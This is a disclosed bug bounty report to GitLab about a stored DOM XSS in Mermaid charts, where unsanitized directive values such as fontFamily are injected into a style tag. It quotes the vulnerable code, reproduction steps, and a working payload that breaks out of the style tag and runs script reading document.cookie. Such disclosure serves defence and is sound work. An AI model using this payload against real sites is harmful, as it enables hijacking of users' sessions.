# Stored DOM XSS via Mermaid chart

## Report Details
- **Report ID**: 1103258
- **URL**: https://hackerone.com/reports/1103258
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-02-14T17:05:15.425Z
- **Disclosed**: 2021-07-12T23:00:30.698Z

## Reporter
- **Username**: taraszelyk
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
## Prologue

Gitlab supports Mermaid as part of GFM to allow users to generate diagrams and flowcharts from text.

In version 8.6.0, Mermaid added a support of directives to add more control over styles(themes) applied to the diagrams.

You can read more about how this works here: https://mermaid-js.github.io/mermaid/#/directives

Syntax for declaring the directive is `%%{init: {<JSON_OBJECT>}}%%`

Directives can be used to overwrite default theme properties like `fontFamily` or `fontSize` to the graph.

Behind the scenes, library takes `JSON_OBJECT` from directive and merges it with config object. Later that config is used to generate new CSS rules:

```
  let userStyles = '';
  // user provided theme CSS
  if (cnf.themeCSS !== undefined) {
    userStyles += `\n${cnf.themeCSS}`;
  }
  // user provided theme CSS
  if (cnf.fontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-font-family: ${cnf.fontFamily}}`;
  }
  // user provided theme CSS
  if (cnf.altFontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}`;
  }
```

## Vulnerability description

Problem is that there is no sanitization of user-supplied values, which are added to `style` tag via `innerHTML` method afterwards:
```
  const stylis = new Stylis();
  const rules = stylis(`#${id}`, getStyles(graphType, userStyles, cnf.themeVariables));

  const style1 = document.createElement('style');
  style1.innerHTML = rules;
  svg.insertBefore(style1, firstChild);
```

This leads to Cross-Site Scripting attack via following directive:
```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
```
## Steps to reproduce

1. Create an issue in any repository
2. Create mermaid diagram with following payload:
```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

3. Save the issue. XSS will be triggered every time a user opens a page with this issue.

## PoC
Visit https://gitlab.com/bugbountyuser1/asdf/-/issues/3
You will see CSP errors in the console. 

{F1195539}

## What is the current *bug* behavior?

Mermaid fails to properly sanitize user-supplied input via directive which leads to XSS.

## What is the expected *correct* behavior?

Mermaid strips/encodes malicious characters, so there is no way to perform XSS attack.

## Output of checks

This vulnerability was tested on gitlab.com. CSP blocks XSS from executing, but I have an idea on how to bypass CSP.
On a local Gitlab instance with a newer version(same as gitlab.com) of Mermaid, it works too.

### Results of GitLab environment info

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:env:info`)

(For installations from source run and paste the output of:
`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)

## Impact

The Impact is standard as for any Stored XSS. User interaction is minimal - the user needs to navigate to a page with a Mermaid chart(issues page, etc). CSP is blocking XSS on gitlab.com, but I can work on XSS bypass if it is needed to show the impact/increase bounty amount. So let me know if you need CSP bypass too.

## Attachments
- 2021-02-14_19-00.png
